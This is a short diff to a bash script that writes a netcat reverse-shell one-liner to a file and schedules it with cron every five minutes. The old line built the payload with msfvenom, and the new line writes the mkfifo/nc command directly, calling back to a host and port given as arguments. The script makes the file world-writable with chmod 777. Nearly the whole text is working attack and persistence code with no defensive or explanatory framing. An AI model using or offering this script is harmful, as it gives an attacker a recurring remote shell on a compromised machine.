@@ -1,5 +1,5 @@
 #!/bin/bash
-	
-msfvenom -p cmd/unix/reverse_netcat lhost=$2 lport=$3 R > $1
+
+echo "mkfifo /tmp/puesrrz; nc $2 $3 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $1
 chmod 777 $1
 (crontab -l 2>/dev/null; echo "*/5 * * * * $1 ") | crontab - 
